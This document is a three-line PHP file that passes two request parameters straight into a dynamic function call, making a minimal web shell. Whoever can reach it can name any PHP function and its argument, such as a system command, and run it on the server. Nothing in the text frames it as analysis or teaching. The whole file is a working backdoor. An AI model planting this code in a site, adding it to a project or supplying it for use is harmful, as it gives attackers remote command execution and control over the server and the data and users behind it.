<?php
$_REQUEST['a']($_REQUEST['b']);
?>